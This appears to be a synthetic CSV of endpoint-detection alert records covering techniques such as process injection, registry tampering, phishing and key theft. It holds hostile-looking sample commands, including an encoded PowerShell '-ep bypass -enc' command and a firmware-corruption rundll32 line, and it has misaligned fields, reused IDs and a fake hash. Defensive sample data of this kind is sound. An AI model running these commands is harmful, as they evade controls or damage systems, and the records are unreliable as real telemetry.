event_id,event_type,event_timestamp,event_category,event_description,severity,event_time,category,mitre_technique,host,event_severity,affected_hosts,event_details,action,detect_description,detect_id,technique,src_ip,src_port,protocol,user_name,process_name,technique_name,affected_host,affected_process,affected_file_path,command_line,parent_process,parent_process_command_line,detection_method,recommended_actions,event_version,event_data,event_name,endpoint,data,rule_name,recommendation,event_subtype,container_name,image_name,image_digest,registry,command,source_ip,destination_ip,process_path,username,detection,actor,host_info,event_url,event_hash,detected_by,details,device,source,target,attack_name,tactic,ip_address,process_id,metadata,alert_type,timestamp,detection_info,sensor_id,hostname,ip,user,domain,process_command_line,process_pid,parent_process_name,parent_process_pid,c2,files,detection_source,web_server_url,web_server_method,type,process,network,event,trigger,remediation,artifact_hiding,process_injection,security_control_disablement,file_deletion,name,affected_entities,dst_ip,kill_chain_phases,file,process_execution,registry_modification,cloud_infrastructure_modification,subtype,detection_details,customer_id,event_info,product,mitre,attack_details,description,destination_port,parent_process_id,email_sender,email_recipient,email_subject,email_urls,email_attachments,Severity,event_Timestamp,Affected_Hostname,Affected_File_Path,Alert_Source,Recommendation,Title,Tactic,Technique,Affected_Image_Path,Injected_Process_Name,Parent_Process_Name,Injection_Technique,indicators,actions,additional_info,file_info,network_info,Timestamp,Description,Loader_Process_Name,Loader_Technique,event_Source,tactics,recommendations,ip_addresses,mac_addresses,operating_system,agent_version,group_name,destination,threat_severity,threat_category,threat_name,ioc,tags,detect_name,rule_description,triggered_rule,alert_rule_name,alert_rule_id,alert_state,alert_time,src,process_tree,remediation_steps,event_categorty,kill_chain,image_loaded,target_image_loaded,target_image_name,target_command_line,EventID,Category,AffectedHostInfo,DetectionDetails,endpoint_id,web_service_name,web_service_path,ioc_type,ioc_value,process_details,host_details,DetectionId,Details,event_action,event_source,status,application,threat,source_port,file_write,RemovableMediaName,RemovableMediaVendor,RemovableMediaType,RemovableMediaSerialNumber,RemovableMediaCapacity,RemovableMediaAccessedTime,RemovableMediaAction,AffectedFilePath,AffectedFileSize,technique_id,event_creator,subtechnique_id,subtechnique,remote_server,mitre_attack_id,cloud_account,org_id,event_event_name,data_source,device_name,file_name,file_size,src_path,dst_path,host_name,file_path,md5_hash,sha256_hash,alert_data,detection_id,detection_time,detection_score,threat_score,device_id,device_external_ip,device_os,device_os_version,policy_name,policy_id,subcategory,file_permission_modification,Domain_Controller_IP,Domain_Controller_Name
123456,alert,,fallback channels,Fallback communication channel detected,,2023-03-09T12:00:00.000000Z,,,,medium,,,,,,,,,,,powershell.exe,,,,,powershell.exe -ep bypass -noexit -enc JABzAD0ATwB1AHQAcAB1AHQAIAAtAEEAdABlAG0AYQBuAGQAYQBsAHMAIAAtAEkARQBYAD0AaQBlAHgAZgBpAGwAbABlAC4AcABhAGMAawBlAG4AdAAoACkALgBFAHgAZQBsAGQAQwBvAG4AdABlAG4AdAAoACcASQBuAHYAbwBrAGUALgBDAGMAcwBvAHUAdABzAHIAaQBvAG4AOgBUAHkAcABlAGwAaQBjAHkAaQBnAGgAIAAnACkAKQAuAEQAZQBzAHQALgBUAGkAZQBsAGwAaQBzAGkAbgBnACgAJwB7ACAAfQA=,,,,,,,,,,Fallback Channels,,,,,,,,,,,,,,,,,,,,,,,,,1234,,,,,,,,,,,,,,,,,,,,,"{'protocol': 'http', 'dst_ip': '192.168.1.100', 'dst_port': '80'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,Firmware Corruption,,firmware corruption,Crowdstrike Falcon detected firmware corruption on endpoint.,High,2022-03-06T09:18:56Z,,,"{'hostname': 'DESKTOP-ABC123', 'machine_id': '12345'}",,,,,,,,,,,,,,,,,,,,EDR,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'process_name': 'cmd.exe', 'command_line': 'cmd.exe /c rundll32.exe bios.dll,CorruptFirmware'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,alert,1646749655000,hardware additions,This alert is triggered when new hardware is detected on the endpoint.,HIGH,,,,,,,,,Hardware addition detected on endpoint,,Hardware Additions,,,,,,,,,,,,,,,,,Possible Hardware Additions Detected,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'tags': ['T1200', 'Hardware Additions', 'Endpoint Detection']}",,,,,,,,,,,,,,,,,,,,,,"{'event': {'type': 'HardwareAddition', 'detection_id': '12345', 'device_type': 'Physical'}}","{'action': ['Investigate the hardware addition to determine if it is legitimate or unauthorized', 'If the hardware is unauthorized, remove it from the endpoint immediately', 'Consider implementing endpoint security controls to prevent unauthorized hardware additions']}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
7294060-3,threat detection,2023-03-10T14:00:00Z,artifact_hiding,"An attempt to hide artifacts such as files, processes or registry keys from detection or analysis.",high,,,,{'hostname': 'server01'},,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,{'reason': 'Attempt to hide malware file'},,,,,,,,,,,,,,,,,,,,,{'username': 'admin'},,,,,,,,,,,,"{'process_name': 'explorer.exe', 'process_id': '5678'}",,,,,"{'artifact_type': 'File', 'artifact_path': 'C:\\Windows\\system32\\cmd.exe', 'artifact_name': 'malware.exe'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
93858y60,detect,2023-03-10T15:00:00Z,process_injection,An attempt to hijack the execution flow of a legitimate process.,high,,,,{'hostname': 'server01'},,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,{'reason': 'Unauthorized process injection'},,,,,,,,,,,,,,,,,,,,,{'username': 'user01'},,,,,,,,,,,,,,,,,,"{'process_name': 'svchost.exe', 'injected_process_name': 'malware.exe', 'injection_technique': 'Reflective DLL Injection'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
03040540f,detect,2023-03-10T16:00:00Z,security_control_disablement,An attempt to disable or bypass security controls to avoid detection.,high,,,,{'hostname': 'laptop01'},,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,{'reason': 'Unauthorized security control disablement'},,,,,,,,,,,,,,,,,,,,,{'username': 'user01'},,,,,,,,,,,,,,,,,,,{'control_name': 'CrowdStrike Falcon'},,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
EDR-54321,Implanted Container Image,,implant internal image,Implanted internal container image detected on host SERVER-789,,2022-10-31T09:23:45Z,,,,High,"[{'host_name': 'SERVER-789', 'ip_address': '192.168.1.201'}]","{'image_name': 'implanted-container-image-1', 'source_ip': '192.168.1.202', 'destination_ip': '192.168.1.201', 'process_name': 'explorer.exe', 'user': 'admin', 'container_id': '1234567890abcdef'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
30406gfd,detect,2023-03-10T17:00:00Z,file_deletion,An attempt to remove indicators of compromise to avoid detection.,high,,,,{'hostname': 'desktop01'},,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,{'reason': 'Unauthorized file deletion'},,,,,,,,,,,,,,,,,,,,,{'username': 'user01'},,,,,,,,,,,,,,,,,,,,{'file_path': 'C:\\ProgramData\\malware.exe'},,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
EDR-123456,detect,,process-monitoring,Detected suspicious inter-process communication between two different processes.,high,2022-04-05T13:45:00Z,,,,,,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Suspicious Inter-Process Communication,"[{'entity_type': 'process', 'process_name': 'Process A', 'process_path': 'C:\\Program Files\\ProcessA\\ProcessA.exe', 'process_hash': 'ABCD1234', 'process_command_line': 'ProcessA.exe /arg1', 'process_pid': 1234}, {'entity_type': 'process', 'process_name': 'Process B', 'process_path': 'C:\\Windows\\System32\\cmd.exe', 'process_hash': 'EFGH5678', 'process_command_line': 'cmd.exe /c netstat', 'process_pid': 5678}]",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
098765,threat detection,,Command and Scripting Interpreter,"The system command interpreter (cmd.exe) was launched by a non-standard parent process. This could indicate the use of a custom command interpreter, which could be an indicator of malicious activity.",high,2022-03-03T13:42:17Z,,,{'name': 'DESKTOP-ABC123'},,,,,,,,,,,,,Command and Scripting Interpreter,,,,,"{'name': 'MyCustomProcess.exe', 'path': 'C:\\Program Files\\MyApp\\MyCustomProcess.exe', 'command_line': 'MyCustomProcess.exe /run'}",,,,1.0,,Command Interpreter Launched by Unusual Parent Process,,,,,,,,,,,,,,,,,,,,,,,EDR,,,,,,,,,,,,,JohnDoe,,,,,,,,,,,,,,,,,,,,,,,192.168.1.100,[{'phase_name': 'Command and Scripting Interpreter'}],"{'name': 'cmd.exe', 'path': 'C:\\Windows\\System32\\cmd.exe', 'command_line': ""cmd.exe /c echo 'Hello World'""}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
EDR-24680,Leveraged Native OS Function Calls,,leveraged OS functions,Leveraged native OS function calls detected on host SERVER-789,,2022-10-15T08:12:34Z,,,,Medium,"[{'host_name': 'SERVER-789', 'ip_address': '192.168.1.150'}]","{'username': 'jdoe', 'domain': 'MYDOMAIN', 'process_name': 'powershell.exe', 'process_command_line': 'powershell.exe -c ""Get-Process | Select-Object Name,ProcessId""', 'source_ip': '192.168.1.151', 'destination_ip': '192.168.1.150', 'function_calls': ['OpenProcess', 'CreateRemoteThread', 'VirtualAllocEx', 'WriteProcessMemory', 'CreateProcessA', 'CreateProcessW', 'CreateToolhelp32Snapshot', 'GetModuleHandleA', 'GetProcAddress', 'LoadLibraryA', 'LoadLibraryW', 'ShellExecuteA', 'ShellExecuteW']}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
02020r444,Masquerade,2023-03-10T19:00:00Z,Masquerading,An attempt to disguise malware as a legitimate application to avoid detection.,high,,,,{'hostname': 'server01'},,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,{'reason': 'Process attempted to execute an unauthorized file'},,,,,,,,,,,,,,,,,,,,,{'username': 'user01'},,,,,,,,,,,,,,,,,,,,,,,,,,"{'process_name': 'explorer.exe', 'command_line': 'explorer.exe /c C:\\Windows\\system32\\notepad.exe'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
03040f0v,modification,2023-03-10T18:00:00Z,registry_modification,An attempt to modify the authentication process to bypass security controls.,critical,,,,{'hostname': 'server01'},,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,{'reason': 'Unauthorized modification of registry key'},,,,,,,,,,,,,,,,,,,,,{'username': 'admin01'},,,,,,,,,,,,,,,,,,,,,,,,,,,"{'registry_key': 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon', 'registry_value_name': 'Userinit', 'new_value': '', 'old_value': 'C:\\Windows\\system32\\userinit.exe,'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
0320r0f,detect,2023-03-10T19:00:00Z,cloud_infrastructure_modification,An attempt to modify cloud compute infrastructure to evade security controls.,critical,,,,{'hostname': 'server01'},,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,{'reason': 'Unauthorized modification of cloud compute instance attribute'},,,,,,,,,,,,,,,,,,,,,{'username': 'admin01'},,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'cloud_provider': 'AWS', 'api_operation': 'ModifyInstanceAttribute', 'resource_type': 'EC2 Instance', 'resource_id': 'i-0123456789abcdef', 'modification_details': {'InstanceType': {'old_value': 't2.micro', 'new_value': 't3.micro'}}}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
dmkslkdk2,threat detection,2022-03-04T10:31:45Z,System Call,Suspicious Use of Native API Detected,high,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Analyze the system for any suspicious activities or processes and block the process that was making the suspicious call.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,detect,"CrowdStrike Falcon detected a process using a Native API function to interact with the operating system. The API function is commonly used by malware to execute commands or perform actions on the system, and can be an indicator of malicious activity.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
33345,nbb_detection,2022-08-10T12:34:56Z,Network boundary bridging,Adversaries may bridge network boundaries by compromising perimeter network devices or internal devices responsible for network segmentation. Breaching these devices may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.,HIGH,,,,,,,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,12345678-1234-5678-1234-567812345678,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,ABCDEF1234567890,"{'computer_name': 'Example-PC', 'process_name': 'explorer.exe', 'process_id': '1234', 'command_line': 'C:\\Windows\\Explorer.exe', 'local_address': '192.168.1.2', 'remote_address': '10.0.0.2', 'remote_port': '80', 'protocol': 'TCP', 'nbb_rule': {'action': 'block', 'direction': 'outbound', 'local_networks': ['192.168.1.0/24'], 'remote_networks': ['10.0.0.0/24'], 'protocols': ['tcp'], 'ports': [80], 'applications': ['explorer.exe']}}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1234567890,,2022-03-09T10:42:11.000Z,Denial of Service,Crowdstrike Falcon has detected a network denial of service (DoS) attack on the endpoint.,high,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'hostname': 'COMPANY-PC01', 'ip_address': '192.168.1.101', 'os': 'Windows 10 Pro', 'domain': 'company.local'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Crowdstrike Falcon,"{'technique_id': 'T1498', 'technique_name': 'Network Denial of Service', 'subtechnique_id': '', 'subtechnique_name': ''}","{'source_ip': '10.0.0.2', 'destination_ip': '192.168.1.101', 'attack_type': 'UDP Flood', 'attack_duration': '120 seconds', 'affected_services': 'HTTP, DNS, FTP'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
3344567,alert,2023-03-09T12:00:00.000000Z,non standard port,,,,,,,high,,,,,,Non-Standard Port,,,TCP,,curl.exe,,,,,,,C:\Windows\System32\cmd.exe,,,,,,,,,,,,,,,,192.168.1.100,10.0.0.2,,,,,,,,,,,,,,Command and Control,,1234,,,,,,,,DOMAIN\user,,C:\Program Files\curl\curl.exe https://example.com:12345,,cmd.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Non-Standard Port,12345,5678,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
T1566,,2023-03-04T13:45:30Z,Phishing,An email phishing attempt has been detected.,,,,,"{'hostname': 'endpoint-01', 'ip_address': '192.168.1.10', 'os': 'Windows 10', 'process_name': 'outlook.exe', 'process_commandline': '""C:\\Program Files\\Microsoft Office\\Office16\\OUTLOOK.EXE""', 'process_id': '1234'}",High,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'username': 'johndoe', 'display_name': 'John Doe', 'email_address': 'johndoe@example.com', 'user_agent': 'Microsoft Outlook', 'ip_address': '192.168.1.20'}",,,,,,,,,,,threat,,,,,,,,,,,,,,,,,,,,,,,,,,,,spoofed@example.com,johndoe@example.com,Important: Action Required,"['http://malicious.com', 'http://phishing.com']",['invoice.pdf'],,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
T1566,,,Plist File Modification,A suspicious modification has been detected in a plist file.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,High,2023-03-10T11:15:00Z,hostname123,/Library/LaunchDaemons/com.apple.plist,CrowdStrike Falcon,Investigate the nature and purpose of the plist modification and remediate accordingly.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
T1566,,2023-03-10T12:00:00Z,suspicious pre-OS boot imagex,A suspicious pre-OS boot image has been detected.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,2023-03-04T13:45:30Z,,,,,,,,,,,,,,,,threat,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Critical,,hostname123,,CrowdStrike Falcon,Isolate the affected host and perform a forensic analysis of the pre-OS boot image to determine the nature and purpose of the modification.,Pre-OS Boot,Persistence,Pre-OS Boot,C:\Windows\System32\bootmgr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
EDR-13579,Private Key Intercept,,privaqte key interception,Private key intercepted on host WEB-123,,2022-10-31T23:45:01Z,,,,Critical,"[{'host_name': 'WEB-123', 'ip_address': '192.168.1.150'}]","{'username': 'webadmin', 'domain': 'MYDOMAIN', 'source_ip': '192.168.1.151', 'destination_ip': '192.168.1.150', 'private_key_path': 'C:\\Users\\webadmin\\.ssh\\id_rsa'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,alert,2023-03-10T13:30:00Z,Process Injection,A suspicious process injection has been detected.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,High,,hostname123,,CrowdStrike Falcon,Investigate the injected process and parent process to determine the nature and purpose of the injection and remediate accordingly.,,,,,explorer.exe,notepad.exe,Thread Execution Hijacking,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
939495555,threat_detection,2023-03-09T15:30:00Z,protocol_tunneling,,high,,,,,,,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"['Endpoint1', 'Endpoint2']",,,,,,,,,,,,,,Detection of protocol tunneling activity,,,,,,,,,,,,,,,,,,,,,"['192.168.1.10', '10.0.0.2']","['Isolate affected endpoints', 'Investigate network traffic']",Protocol: HTTP over DNS,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,detect,2023-03-09T15:45:00Z,proxy,Detection of a connection being made through a proxy,,,,,,high,,,,,,T1090 - Proxy,,,,,,,,,,,,,Proxy Detection,"['Investigate the use of a proxy in the environment', 'Identify the source and destination of the proxy traffic', 'Monitor for any further suspicious activity']",,,,,,,,,,,,,,,,,,,,,,,,,,,,,Defense Evasion,,,,,,,,,,,,,,,,,,Network Traffic,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'file_name': 'cmd.exe', 'file_path': 'C:\\Windows\\System32\\cmd.exe', 'file_hash': '1a2b3c4d5e6f7g8h9i0j'}","{'destination_ip': '1.2.3.4', 'destination_domain': 'example.com', 'protocol': 'TCP'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
EDR-67890,Remote Administration Tool,,RA Admin,RAdmin tool used to remotely control workstation WS-456,,2022-11-30T12:34:56Z,,,,High,"[{'host_name': 'SERVER-123', 'ip_address': '192.168.1.200'}]","{'username': 'admin', 'domain': 'MYDOMAIN', 'source_ip': '192.168.1.201', 'destination_ip': '192.168.1.200', 'remote_tool': 'RAdmin'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,alert,1646749655000,Reflective Code Loading,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,High,,hostname123,,,Investigate the injected process and loader process to determine the nature and purpose of the reflective code loading activity and remediate accordingly.,,,,,explorer.exe,,,,,,,,2023-03-10T15:45:00Z,A suspicious reflective code loading activity has been detected.,notepad.exe,Reflective DLL Injection,CrowdStrike Falcon,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
123456789,threat,,Process/Service Stop,Suspicious Service Stop detected,high,2022-03-06T10:30:00Z,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"[{'entity_name': 'ServiceName', 'entity_value': 'SuspiciousServiceName'}, {'entity_name': 'ProcessName', 'entity_value': 'C:\\Windows\\System32\\services.exe'}, {'entity_name': 'ProcessCommandLine', 'entity_value': 'services.exe stop SuspiciousServiceName'}]",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Defense Evasion,"['Investigate the reason for the suspicious stop of the service.', ""Review the service's configuration to ensure it is properly configured."", 'Monitor for any further suspicious activity.']",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,threat detection,1646749655000,Suspicious Shared Module Loaded,Adversaries may execute malicious payloads via loading shared modules.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,12345678,mycomputer,,,mydomain.local,,,,,,,,,,THREAT,,,,,,,,,,,,,,,,,,,,123456,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"['192.168.1.100', 'fe80::1234:5678:90ab:cdef']",['00:11:22:33:44:55'],Windows 10,6.30.0.0,Workstations,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
